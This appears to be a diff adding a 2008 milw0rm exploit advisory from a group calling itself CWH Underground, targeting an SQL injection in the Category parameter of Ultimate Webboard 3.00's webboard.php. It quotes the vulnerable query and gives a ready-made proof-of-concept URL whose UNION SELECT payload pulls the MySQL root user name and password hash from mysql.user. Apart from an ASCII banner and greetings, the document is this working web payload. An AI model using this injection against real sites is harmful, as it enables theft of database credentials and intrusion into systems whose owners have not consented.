@@ -1,0 +1,57 @@
+================================================================================
+  Ultimate Webboard (webboard.php Category) Remote SQL Injection Vulnerability
+================================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 26 September 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+APPLICATION : Ultimate Webboard 
+VERSION     : 3.00
+DOWNLOAD    : http://php.deeserver.net/download/get/79/webboard3.0.0.zip
+#####################################################
+
+--- Remote SQL Injection ---
+
+** Magic Quote must turn off **
+
+-----------------------------------
+ Vulnerable File (webboard.php)
+-----------------------------------
+
+$sql="select * from board_data where Category='$Category' order by No DESC";
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[webboard]/webboard.php?Category=[Category'name][SQL Injection]
+
+
+------
+ POC
+------
+
+[+] http://[Target]/[webboard]/webboard.php?Category=general'/**/UNION/**/SELECT/**/1,concat(user,0x3a3a,password),3,4,5,6,7,8/**/FROM/**/mysql.user/**/where/**/user='root
+
+
+#####################################################################
+Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#####################################################################
+
+# milw0rm.com [2008-09-26]
